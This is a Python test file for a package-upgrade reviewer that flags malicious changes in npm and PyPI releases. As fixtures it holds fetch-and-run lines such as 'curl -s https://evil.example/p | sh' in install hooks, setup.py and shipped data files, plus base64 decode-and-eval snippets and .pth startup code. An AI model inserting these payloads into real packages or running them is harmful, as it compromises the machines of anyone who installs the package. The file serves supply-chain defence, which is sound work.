from __future__ import annotations

import base64
import hashlib
import io
import json
import sys
import tarfile

from packaging.tags import sys_tags
from tests.test_upgrade_review import NPM, Registry, _kinds, _one, _wheel, registry

from ca9 import api
from ca9.review import upgrade_rules

__all__ = ["registry"]

B64_PRINT = base64.b64encode(b"print(1)").decode()


def _tar_entries(entries):
    stream = io.BytesIO()
    with tarfile.open(fileobj=stream, mode="w:gz") as archive:
        for path, data in entries:
            info = tarfile.TarInfo(path)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return stream.getvalue()


def npm_raw(registry: Registry, name, version, entries):
    raw = _tar_entries(
        [(path, data if isinstance(data, bytes) else data.encode()) for path, data in entries]
    )
    url = f"{NPM}/{name}/-/{name}-{version}.tgz"
    registry.archives[url] = raw
    integrity = "sha512-" + base64.b64encode(hashlib.sha512(raw).digest()).decode()
    registry.documents[f"{NPM}/{name}/{version}"] = json.dumps(
        {
            "name": name,
            "version": version,
            "dist": {"tarball": url, "integrity": integrity},
            "_npmUser": {"name": "alice"},
            "maintainers": [{"name": "alice"}],
        }
    ).encode()
    return integrity


def _manifest(name, version, **extra):
    return json.dumps({"name": name, "version": version, "main": "index.js", **extra})


def pypi_wheels(registry: Registry, name, version, wheels):
    urls = [
        registry._pypi_file(
            f"{name}-{version}-{tag}.whl", "bdist_wheel", _wheel(name, version, files)
        )
        for tag, files in wheels
    ]
    registry.documents[f"https://pypi.org/pypi/{name}/{version}/json"] = json.dumps(
        {"info": {"name": name, "version": version}, "urls": urls}
    ).encode()


def _hook_package(registry, version, install_js, extra=None):
    registry.npm(
        "sample",
        version,
        {"index.js": "module.exports = 1;\n", "install.js": install_js, **(extra or {})},
        manifest={"scripts": {"postinstall": "node install.js"}},
    )


def test_install_script_body_turning_into_download_pipe_blocks(registry):
    _hook_package(registry, "1.0.0", "const v = '1.0.0';\nconsole.log('ready', v);\n")
    _hook_package(
        registry,
        "1.0.1",
        "const v = '1.0.1';\nrequire('child_process').execSync('curl -s https://x.invalid/p | sh');\n",
    )
    _hook_package(registry, "1.0.2", "const v = '1.0.2';\nconsole.log('ready', v);\n")
    _hook_package(
        registry, "1.0.3", "const v = '1.0.3';\nif (v) {\n  console.log('ready', v);\n}\n"
    )

    attack, _ = _one("npm", "sample", "1.0.0", "1.0.1")
    version_only, _ = _one("npm", "sample", "1.0.0", "1.0.2")
    logic_change, _ = _one("npm", "sample", "1.0.0", "1.0.3")

    assert "new_install_hook" in _kinds(attack, "block")
    assert version_only["block"] == [] and version_only["warn"] == []
    assert logic_change["block"] == []
    assert _kinds(logic_change, "warn") == ["install_script_changed"]


def test_file_required_by_install_script_is_install_time_code(registry):
    downloader = (
        "const https = require('https');\nconst { execFileSync } = require('child_process');\n"
        "https.get('https://x.invalid/bin', (r) => { execFileSync('/tmp/bin'); });\n"
    )
    for version, body in (("1.0.0", "module.exports = 0;\n"), ("1.0.1", downloader)):
        _hook_package(
            registry,
            version,
            "require('./lib/fetch.js');\n",
            {"lib/fetch.js": body},
        )

    result, _ = _one("npm", "sample", "1.0.0", "1.0.1")

    assert "new_install_hook" in _kinds(result, "block")


def test_setup_py_call_whose_arguments_turn_into_a_shell_pipe_blocks(registry):
    old = "import subprocess\nfrom setuptools import setup\nsubprocess.check_call(['make'])\nsetup()\n"
    new = (
        "import subprocess\nfrom setuptools import setup\n"
        "subprocess.check_call('curl https://x.invalid | sh', shell=True)\nsetup()\n"
    )
    registry.pypi("demo", "1.0", sdist={"setup.py": old, "demo/__init__.py": "X = 1\n"})
    registry.pypi("demo", "1.1", sdist={"setup.py": new, "demo/__init__.py": "X = 1\n"})

    result, _ = _one("pypi", "demo", "1.0", "1.1")

    assert _kinds(result, "block") == ["new_install_hook"]


def test_duplicate_manifest_keys_do_not_disable_code_rules(registry):
    payload = f"eval(Buffer.from('{B64_PRINT}', 'base64').toString());\n"
    npm_raw(
        registry,
        "sample",
        "1.0.0",
        [("package/package.json", _manifest("sample", "1.0.0")), ("package/index.js", "1;\n")],
    )
    duplicated = '{"name": "sample", "version": "1.0.1", "main": "index.js", "main": "index.js"}'
    npm_raw(
        registry,
        "sample",
        "1.0.1",
        [("package/package.json", duplicated), ("package/index.js", payload)],
    )

    result, _ = _one("npm", "sample", "1.0.0", "1.0.1")

    assert "new_decode_exec" in _kinds(result, "block")
    assert any("duplicate" in item for item in result.get("limitations", []))


def test_bom_and_oversized_manifests_still_expose_install_hooks(registry):
    npm_raw(
        registry,
        "sample",
        "1.0.0",
        [("package/package.json", _manifest("sample", "1.0.0")), ("package/index.js", "1;\n")],
    )
    bom = "﻿" + _manifest("sample", "1.0.1", scripts={"preinstall": "node x.js"})
    npm_raw(
        registry, "sample", "1.0.1", [("package/package.json", bom), ("package/index.js", "1;\n")]
    )
    padded = _manifest(
        "sample", "1.0.2", description="x" * (3 * 1024 * 1024), scripts={"postinstall": "node x.js"}
    )
    npm_raw(
        registry,
        "sample",
        "1.0.2",
        [("package/package.json", padded), ("package/index.js", "1;\n")],
    )

    with_bom, _ = _one("npm", "sample", "1.0.0", "1.0.1")
    oversized, _ = _one("npm", "sample", "1.0.0", "1.0.2")

    assert "new_install_hook" in _kinds(with_bom, "block")
    assert "new_install_hook" in _kinds(oversized, "block")


def test_bom_pth_file_is_startup_code(registry):
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "X = 1\n"})
    registry.pypi(
        "demo",
        "1.1",
        wheel={"demo/__init__.py": "X = 1\n", "demo.pth": "﻿import os; os.system('id')\n"},
    )

    result, _ = _one("pypi", "demo", "1.0", "1.1")

    assert _kinds(result, "block") == ["new_pth_code"]


def test_large_files_are_scanned_and_beyond_the_cap_are_incomplete(registry, monkeypatch):
    filler = "var a = 1;\n" * (300 * 1024)
    payload = f"eval(Buffer.from('{B64_PRINT}', 'base64').toString());\n"
    registry.npm("sample", "1.0.0", {"index.js": "1;\n", "dist/big.js": filler})
    registry.npm("sample", "1.0.1", {"index.js": "1;\n", "dist/big.js": filler + payload})

    scanned, _ = _one("npm", "sample", "1.0.0", "1.0.1")
    monkeypatch.setattr(upgrade_rules, "MAX_SCAN_BYTES", 1024 * 1024)
    capped, receipt = _one("npm", "sample", "1.0.0", "1.0.1")

    assert "new_decode_exec" in _kinds(scanned, "block")
    assert scanned.get("complete", True) is True
    assert capped["complete"] is False
    assert any("dist/big.js" in item for item in capped["limitations"])
    assert receipt["complete"] is False


def test_reviews_the_wheel_pip_would_install_here(registry):
    best = str(next(iter(sys_tags())))
    clean = {"demo/__init__.py": "X = 1\n"}
    pypi_wheels(registry, "demo", "1.0", [("py3-none-any", clean), (best, clean)])
    hooked = {**clean, "demo.pth": "import os; os.system('id')\n"}
    pypi_wheels(registry, "demo", "1.1", [("py3-none-any", clean), (best, hooked)])

    result, _ = _one("pypi", "demo", "1.0", "1.1")

    assert _kinds(result, "block") == ["new_pth_code"]
    assert best in result["artifacts"]["new"]["filename"]


def test_sourceless_bytecode_imported_at_import_time_blocks(registry):
    bytecode = b"\xcb\r\r\n" + b"\x00" * 60
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "X = 1\n"})
    registry.pypi(
        "demo",
        "1.1",
        wheel={
            "demo/__init__.py": "from . import _boot\nX = 1\n",
            "demo/_boot.pyc": bytecode,
            "demo/_unused.pyc": bytecode,
        },
    )

    result, _ = _one("pypi", "demo", "1.0", "1.1")

    assert _kinds(result, "block") == ["uninspectable_import_time_code"]
    assert result["block"][0]["path"] == "demo/_boot.pyc"
    assert [d["path"] for d in result["warn"] if d["kind"] == "new_native_binary"] == [
        "demo/_unused.pyc"
    ]


def test_npm_tarball_second_root_and_case_collisions_block(registry):
    npm_raw(
        registry,
        "sample",
        "1.0.0",
        [("package/package.json", _manifest("sample", "1.0.0")), ("package/index.js", "1;\n")],
    )
    npm_raw(
        registry,
        "sample",
        "1.0.1",
        [
            ("package/package.json", _manifest("sample", "1.0.1")),
            ("package/index.js", "1;\n"),
            (
                "zzz/package.json",
                _manifest("sample", "1.0.1", scripts={"postinstall": "node x.js"}),
            ),
        ],
    )
    npm_raw(
        registry,
        "sample",
        "1.0.2",
        [
            ("package/package.json", _manifest("sample", "1.0.2")),
            ("package/index.js", "1;\n"),
            ("package/INDEX.js", "require('child_process').exec('id');\n"),
        ],
    )

    second_root, _ = _one("npm", "sample", "1.0.0", "1.0.1")
    case_collision, _ = _one("npm", "sample", "1.0.0", "1.0.2")

    assert {"ambiguous_package_contents", "new_install_hook"} <= set(_kinds(second_root, "block"))
    assert "ambiguous_package_contents" in _kinds(case_collision, "block")


def test_startup_module_downgrades_block(registry):
    base = {"demo/__init__.py": "X = 1\n"}
    registry.pypi("demo", "1.0", wheel=base)
    registry.pypi("demo", "1.1", wheel={**base, "sitecustomize/__init__.py": "import demo\n"})
    shadow = "winreg"
    if sys.platform == "win32":
        shadow = "_posixsubprocess"
    registry.pypi(
        "demo",
        "1.2",
        wheel={**base, "demo.pth": f"import {shadow}\n", f"{shadow}.py": "X = 1\n"},
    )
    registry.pypi(
        "fresh",
        "1.0",
        wheel={
            "fresh/__init__.py": "X = 1\n",
            "fresh.pth": "import fresh_boot\n",
            "fresh_boot.py": "import os\nos.system('id')\n",
        },
    )

    package_startup, _ = _one("pypi", "demo", "1.0", "1.1")
    shadowed, _ = _one("pypi", "demo", "1.0", "1.2")
    report = api.review_upgrades(
        [{"ecosystem": "pypi", "name": "fresh", "old": None, "new": "1.0"}]
    )

    assert _kinds(package_startup, "block") == ["new_sitecustomize"]
    assert _kinds(shadowed, "block") == ["ambiguous_package_contents", "new_pth_code"]
    assert [d["path"] for d in shadowed["block"] if d["kind"] == "ambiguous_package_contents"] == [
        f"{shadow}.py"
    ]
    assert "new_pth_code" in _kinds(report["results"][0], "block")


def test_extensionless_require_cross_file_decoders_and_shadowing_bins(registry):
    payload = f"eval(Buffer.from('{B64_PRINT}', 'base64').toString());\n"
    registry.npm("sample", "1.0.0", {"index.js": "module.exports = 1;\n"})
    registry.npm(
        "sample",
        "1.0.1",
        {"index.js": "require('./lib/data.txt');\n", "lib/data.txt": payload},
    )
    registry.npm(
        "sample",
        "1.0.2",
        {
            "index.js": "const { d } = require('./dec');\nrequire(d('==Abh5mbktmZ'));\n",
            "dec.js": "function d(s) { return Buffer.from(s, 'base64').toString(); }\nmodule.exports = { d };\n",
        },
    )
    registry.npm(
        "sample",
        "1.0.3",
        {"index.js": "1;\n", "git": "#!/bin/sh\n"},
        manifest={"bin": {"git": "git"}},
    )
    registry.npm(
        "sample",
        "1.0.4",
        {"index.js": "1;\n", "cli.js": "1;\n"},
        manifest={"bin": {"sample": "cli.js"}},
    )
    registry.npm("sample", "1.0.5", {"index.js": "const pad = '\x00';\n" + payload})

    extensionless, _ = _one("npm", "sample", "1.0.0", "1.0.1")
    nul_prefixed, _ = _one("npm", "sample", "1.0.0", "1.0.5")
    cross_file, _ = _one("npm", "sample", "1.0.0", "1.0.2")
    shadowing, _ = _one("npm", "sample", "1.0.0", "1.0.3")
    own_name, _ = _one("npm", "sample", "1.0.0", "1.0.4")

    assert "new_decode_exec" in _kinds(extensionless, "block")
    assert "new_decode_exec" in _kinds(cross_file, "block")
    assert _kinds(shadowing, "block") == ["shadows_system_command"]
    assert own_name["block"] == []
    assert "new_decode_exec" in _kinds(nul_prefixed, "block")


def test_python_cross_module_decoder_console_script_and_changed_binary(registry):
    base = {"demo/__init__.py": "X = 1\n", "demo/_core.so": b"\x7fELF\x02" + b"\x00" * 64}
    registry.pypi("demo", "1.0", wheel=base)
    registry.pypi(
        "demo",
        "1.1",
        wheel={
            **base,
            "demo/util.py": "import base64\n\ndef unpack(blob):\n    return base64.b64decode(blob)\n",
            "demo/run.py": f"from .util import unpack\n\ndef go():\n    exec(unpack('{B64_PRINT}'))\n",
        },
    )
    registry.pypi(
        "demo",
        "1.2",
        wheel={
            **base,
            "demo-1.2.dist-info/entry_points.txt": "[console_scripts]\npip = demo:main\n",
        },
    )
    registry.pypi("demo", "1.3", wheel={**base, "demo/_core.so": b"\x7fELF\x02" + b"\x01" * 64})

    cross_module, _ = _one("pypi", "demo", "1.0", "1.1")
    console, _ = _one("pypi", "demo", "1.0", "1.2")
    changed_binary, _ = _one("pypi", "demo", "1.0", "1.3")
    strict, _ = _one("pypi", "demo", "1.0", "1.3", warn_on_changed_binaries=True)

    assert _kinds(cross_module, "block") == ["new_decode_exec"]
    assert _kinds(console, "block") == ["shadows_system_command"]
    assert changed_binary["warn"] == []
    assert [d["kind"] for d in changed_binary["info"]] == ["native_binary_changed"]
    assert _kinds(strict, "warn") == ["native_binary_changed"]


def test_unparseable_python_is_incomplete_unless_regex_proves_a_block(registry):
    registry.pypi("demo", "1.0", wheel={"demo/__init__.py": "X = 1\n"})
    registry.pypi(
        "demo", "1.1", wheel={"demo/__init__.py": "X = 1\n", "demo/legacy.py": "print 'hello'\n"}
    )
    registry.pypi(
        "demo",
        "1.2",
        wheel={
            "demo/__init__.py": "X = 1\n",
            "demo/legacy.py": f"import base64\nprint 'x'\nexec(base64.b64decode('{B64_PRINT}'))\n",
        },
    )

    unparsed, receipt = _one("pypi", "demo", "1.0", "1.1")
    proven, _ = _one("pypi", "demo", "1.0", "1.2")

    assert unparsed["complete"] is False and receipt["complete"] is False
    assert any("demo/legacy.py" in item for item in unparsed["limitations"])
    assert _kinds(proven, "block") == ["new_decode_exec"]
    assert proven.get("complete", True) is True


def test_lockfile_integrity_that_the_registry_does_not_serve_blocks(registry):
    registry.npm("sample", "1.0.0", {"index.js": "1;\n"})
    registry.npm("sample", "1.0.1", {"index.js": "2;\n"})
    stale = "sha512-" + base64.b64encode(hashlib.sha512(b"other bytes").digest()).decode()

    report = api.review_upgrades(
        [{"ecosystem": "npm", "name": "sample", "old": "1.0.0", "new": "1.0.1", "integrity": stale}]
    )

    assert _kinds(report["results"][0], "block") == ["lockfile_artifact_mismatch"]


PAYLOAD = "import os\nos.system('curl -s https://evil.example/p | sh')\n"
FILE_EXEC_HEAD = (
    "import os, runpy, marshal, json, importlib.util\n"
    "from importlib.machinery import SourceFileLoader\n"
    "from pathlib import Path\n"
    "HERE = os.path.dirname(__file__)\n"
)


def test_import_time_exec_of_a_shipped_file_blocks_and_names_the_file(registry):
    cases = {
        "exec(open(os.path.join(os.path.dirname(__file__), '_d.txt')).read())\n": "_d.txt",
        "p = os.path.join(HERE, '_d.txt')\nexec(compile(open(p).read(), p, 'exec'))\n": "_d.txt",
        "with open(os.path.join(HERE, '_d.txt')) as f:\n    exec(f.read())\n": "_d.txt",
        "exec(Path(__file__).with_name('_d.txt').read_text())\n": "_d.txt",
        "runpy.run_path(os.path.join(HERE, 'x.dat'))\n": "x.dat",
        "runpy.run_module('{name}._boot')\n": "_boot.py",
        "SourceFileLoader('x', os.path.join(HERE, 'x.dat')).load_module()\n": "x.dat",
        (
            "loader = SourceFileLoader('x', os.path.join(HERE, 'x.dat'))\n"
            "spec = importlib.util.spec_from_file_location('x', loader.path, loader=loader)\n"
            "spec.loader.exec_module(importlib.util.module_from_spec(spec))\n"
        ): "x.dat",
        "exec(marshal.loads(open(os.path.join(HERE, 'x.bin'), 'rb').read()))\n": "x.bin",
    }
    for index, (code, payload) in enumerate(cases.items()):
        name = f"fx{index}"
        registry.pypi(name, "1.0", wheel={f"{name}/__init__.py": "VALUE = 1\n"})
        registry.pypi(
            name,
            "1.1",
            wheel={
                f"{name}/__init__.py": FILE_EXEC_HEAD + code.replace("{name}", name),
                f"{name}/{payload}": PAYLOAD,
            },
        )

        result, _receipt = _one("pypi", name, "1.0", "1.1")

        decoded = [delta for delta in result["block"] if delta["kind"] == "new_decode_exec"]
        assert len(decoded) == 1, code
        assert f"{name}/{payload}" in decoded[0]["detail"], code
        assert set(_kinds(result, "block")) <= {"new_decode_exec", "new_import_time_exec"}, code


def test_npm_eval_of_a_shipped_file_blocks_at_load_and_install_time(registry):
    js_payload = "require('child_process').execSync('curl -s https://evil.example/p | sh');\n"
    cases = [
        "eval(require('fs').readFileSync(__dirname + '/d.bin', 'utf8'));\n",
        "const fs = require('fs'), path = require('path');\n"
        "new Function(fs.readFileSync(path.join(__dirname, 'd.bin'), 'utf8'))();\n",
        "const vm = require('vm');\n"
        "vm.runInNewContext(require('fs').readFileSync(`${__dirname}/d.bin`, 'utf8'), {});\n",
        "const vm = require('vm');\nconst code = require('fs').readFileSync(__dirname + '/d.bin');\n"
        "new vm.Script(code.toString()).runInThisContext();\n",
        "const fs = require('fs');\n"
        "fs.readFile(__dirname + '/d.bin', 'utf8', (err, data) => { module._compile(data, 'x'); });\n",
    ]
    for index, code in enumerate(cases):
        name = f"jx{index}"
        registry.npm(name, "1.0.0", {"index.js": "module.exports = 1;\n"})
        registry.npm(name, "1.1.0", {"index.js": code, "d.bin": js_payload})

        result, _receipt = _one("npm", name, "1.0.0", "1.1.0")

        assert "new_decode_exec" in _kinds(result, "block"), code
        assert "d.bin" in result["block"][0]["detail"], code

    hook = {"scripts": {"postinstall": "node install.js"}}
    registry.npm("jxi", "1.0.0", {"install.js": "console.log(1);\n"}, manifest=hook)
    registry.npm(
        "jxi",
        "1.1.0",
        {"install.js": cases[0], "d.bin": js_payload},
        manifest=hook,
    )
    result, _receipt = _one("npm", "jxi", "1.0.0", "1.1.0")
    assert any(
        delta["kind"] == "new_decode_exec" and "at install time" in delta["detail"]
        for delta in result["block"]
    )


def test_payload_swapped_into_an_unchanged_file_loader_blocks_but_data_reads_do_not(registry):
    loader = FILE_EXEC_HEAD + "exec(open(os.path.join(HERE, '_d.txt')).read())\n"
    registry.pypi("fs", "1.0", wheel={"fs/__init__.py": loader, "fs/_d.txt": "X = 1\n"})
    registry.pypi("fs", "1.1", wheel={"fs/__init__.py": loader, "fs/_d.txt": "X = 2\n"})
    registry.pypi("fs", "1.2", wheel={"fs/__init__.py": loader, "fs/_d.txt": PAYLOAD})
    data = (
        FILE_EXEC_HEAD + "CONFIG = json.load(open(os.path.join(HERE, 'c.json')))\nexec('Y = 1')\n"
    )
    registry.pypi("fd", "1.0", wheel={"fd/__init__.py": "VALUE = 1\n"})
    registry.pypi("fd", "1.1", wheel={"fd/__init__.py": data, "fd/c.json": "{}"})
    registry.npm("jd", "1.0.0", {"index.js": "module.exports = 1;\n"})
    registry.npm(
        "jd",
        "1.1.0",
        {
            "index.js": "const fs = require('fs');\n"
            "module.exports = JSON.parse(fs.readFileSync(__dirname + '/c.json', 'utf8'));\n"
            "eval('1 + 1');\n",
            "c.json": "{}",
        },
    )

    literal_only, _ = _one("pypi", "fs", "1.0", "1.1")
    payload, _ = _one("pypi", "fs", "1.0", "1.2")
    python_data, _ = _one("pypi", "fd", "1.0", "1.1")
    npm_data, _ = _one("npm", "jd", "1.0.0", "1.1.0")

    assert literal_only["block"] == []
    assert _kinds(payload, "block") == ["new_decode_exec"]
    assert python_data["block"] == [] and python_data["warn"] == []
    assert npm_data["block"] == []


def test_build_hook_exec_of_a_shipped_file_judges_that_file(registry):
    setup = "from setuptools import setup\nexec(open('demo/v.txt').read())\nsetup()\n"
    base = {"demo/__init__.py": "VALUE = 1\n", "setup.py": setup}
    registry.pypi("demo", "1.0", sdist={**base, "demo/v.txt": "__version__ = '1.0'\n"})
    registry.pypi("demo", "1.1", sdist={**base, "demo/v.txt": "__version__ = '1.1'\n"})
    registry.pypi("demo", "1.2", sdist={**base, "demo/v.txt": PAYLOAD})

    version_bump, _ = _one("pypi", "demo", "1.0", "1.1")
    payload, _ = _one("pypi", "demo", "1.0", "1.2")

    assert version_bump["block"] == []
    assert _kinds(payload, "block") == ["new_install_hook"]
    assert payload["block"][0]["path"] == "demo/v.txt"
